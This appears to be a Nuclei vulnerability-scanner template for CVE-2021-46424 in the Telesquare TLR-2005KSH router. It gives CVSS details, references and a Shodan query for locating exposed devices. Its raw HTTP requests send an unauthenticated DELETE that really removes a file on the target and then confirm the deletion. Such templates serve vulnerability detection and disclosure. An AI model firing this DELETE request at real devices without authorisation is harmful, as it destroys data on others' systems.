id: CVE-2021-46424
info:
  name: Telesquare TLR-2005KSH 1.0.0 - Arbitrary File Delete
  author: gy741
  severity: critical
  description: Telesquare TLR-2005KSH 1.0.0 is vulnerable to an arbitrary file deletion
    exploit, allowing remote attackers to delete any file, including system internal
    files, through a DELETE request.
  reference:
  - https://dl.packetstormsecurity.net/2205-exploits/tlr2005ksh-filedelete.txt
  - https://drive.google.com/drive/folders/1_e3eJ8fzhCWnCkoRpbLoyQecuKkPR4OD?usp=sharing
  - http://packetstormsecurity.com/files/167127/TLR-2005KSH-Arbitrary-File-Delete.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-46424
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2021-46424
    cwe-id: CWE-306
  metadata:
    shodan-query: http.html:"TLR-2005KSH"
    verified: 'true'
    impact: The impact of CVE-2021-46424 in Telesquare TLR-2005KSH 1.0.0 is significant
      as a remote attacker can delete any file, including system internal files, through
      a DELETE request, causing potential damage to the system and compromising its
      security.
    recommendation: It is recommended to update Telesquare TLR-2005KSH to a version
      that is not susceptible to the CVE-2021-46424 vulnerability.
  tags: cve,cve2021,telesquare,intrusive,packetstorm
requests:
- raw:
  - 'GET /images/icons_title.gif HTTP/1.1

    Host: {{Hostname}}

    '
  - 'DELETE /images/icons_title.gif HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /images/icons_title.gif HTTP/1.1

    Host: {{Hostname}}

    '
  req-condition: true
  matchers-condition: and
  matchers:
  - type: dsl
    dsl:
    - status_code_1 == 200 && status_code_2 == 204 && status_code_3 == 404
